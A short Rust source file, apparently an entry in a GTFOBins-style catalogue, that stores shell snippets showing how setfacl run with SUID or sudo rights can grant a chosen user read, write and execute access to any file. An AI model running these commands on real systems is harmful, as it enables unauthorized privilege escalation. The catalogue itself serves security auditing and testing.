pub static BIN_NAME: &'static str = "setfacl";
pub static BIN_DESC: &'static str = "This can be run with elevated privileges to change ownership and then read, write, or execute a file.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which setfacl) .

    LFILE=file_to_change
    USER=somebody
    ./setfacl -m u:$USER:rwx $LFILE
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_change
    USER=somebody
    sudo setfacl -m -u:$USER:rwx $LFILE
"#;
use crate::code::{Code, Tag};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
